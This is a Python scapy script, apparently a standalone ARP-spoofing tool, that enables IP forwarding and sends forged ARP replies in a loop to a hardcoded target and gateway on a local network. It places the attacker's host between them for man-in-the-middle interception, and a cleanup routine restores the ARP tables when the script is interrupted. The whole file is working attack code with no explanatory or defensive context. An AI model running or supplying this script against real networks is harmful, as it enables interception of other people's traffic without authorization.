from scapy.all import sr, send, ARP, conf

import os
import signal
import sys
import threading
import time

gw_ip = '192.168.1.1'
target_ip = '192.168.1.241'
conf.verb = 0
poisoning_rate = 2

def get_mac(ip):
    resp, _ = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10)
    for _, r in resp:
        return r[ARP].hwsrc
    return None

def arp_poison(gw_ip, gw_mac, target_ip, target_mac):
    try:
        while True:
            send(ARP(op=2, pdst=gw_ip, hwdst=gw_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip))
            time.sleep(poisoning_rate)
    except KeyboardInterrupt:
        print('Cleaning up')
        restore_network(gw_ip, gw_mac, target_ip, target_mac)
        

def restore_network(gw_ip, gw_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gw_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gw_mac, psrc=gw_ip), count=5)
    print('Disabling ip fowarding')
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

if __name__ == '__main__':
    print('Enabling ip fowarding')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    gw_mac = get_mac(gw_ip)
    if gw_mac is None:
        print('Cannot get gw mac adress')
        sys.exit(1)
    print(f'gw mac adress: {gw_mac}')

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print('Cannot get target mac adress')
        sys.exit(1)
    print(f'target mac adress: {target_mac}')
    
    arp_poison(gw_ip, gw_mac, target_ip, target_mac)
